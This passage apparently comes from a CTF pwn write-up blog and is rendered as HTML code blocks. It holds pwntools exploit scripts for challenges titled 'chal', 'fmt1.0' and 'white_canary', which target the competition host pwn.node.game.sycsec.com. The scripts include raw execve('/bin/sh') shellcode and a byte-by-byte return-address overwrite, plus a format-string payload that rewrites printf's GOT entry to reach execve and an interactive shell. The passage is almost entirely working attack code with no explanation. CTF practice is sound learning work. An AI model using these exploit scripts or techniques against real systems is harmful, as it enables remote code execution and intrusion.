data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30069</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./chal')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./chal')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>index_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>rl<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x4</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>index_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05'</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sl<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'40'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'41'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'42'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'43'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'44'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'45'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"fmt10\"><a class=\"markdownIt-Anchor\" href=\"#fmt10\">#</a> fmt1.0</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">31898</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./fmt1.0')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./fmt1.0')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./fmt1.0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x401257</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>print_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>execve <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'execve'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload<span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x404020</span><span class=\"token punctuation\">:</span><span class=\"token number\">0x4010D0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>payload <span class=\"token operator\">=</span><span class=\"token string\">b'/bin/sh\\x00'</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"white_canary\"><a class=\"markdownIt-Anchor\" href=\"#white_canary\">#</a> white_canary</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span 